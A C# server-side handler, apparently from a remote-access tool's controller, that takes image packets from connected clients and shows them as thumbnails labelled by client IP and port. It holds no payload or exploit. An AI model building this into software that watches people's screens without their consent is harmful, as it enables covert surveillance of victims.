using Server.MessagePack;
using Server.Sockets;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    public class HandleThumbnails
    {
        public HandleThumbnails(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                if (Program.form1.listView3.InvokeRequired)
                {
                    Program.form1.listView3.BeginInvoke((MethodInvoker)(() =>
                    {
                        if (client.LV2 == null && Program.form1.GetThumbnails.Tag == (object)"started")
                        {
                            client.LV2 = new ListViewItem();
                            client.LV2.Text = string.Format("{0}:{1}", client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0], client.ClientSocket.LocalEndPoint.ToString().Split(':')[1]);
                            client.LV2.ToolTipText = client.ID;
                            using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                            {
                                Program.form1.ThumbnailImageList.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
                                client.LV2.ImageKey = client.ID;
                                lock (Settings.Listview3Lock)
                                {
                                    Program.form1.listView3.Items.Add(client.LV2);
                                }
                            }
                        }
                        else
                        {
                            using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                            {
                                lock (Settings.Listview3Lock)
                                {
                                    Program.form1.ThumbnailImageList.Images.RemoveByKey(client.ID);
                                    Program.form1.ThumbnailImageList.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
                                }
                            }
                        }
                    }));
                }
            }
            catch { }
        }
    }
}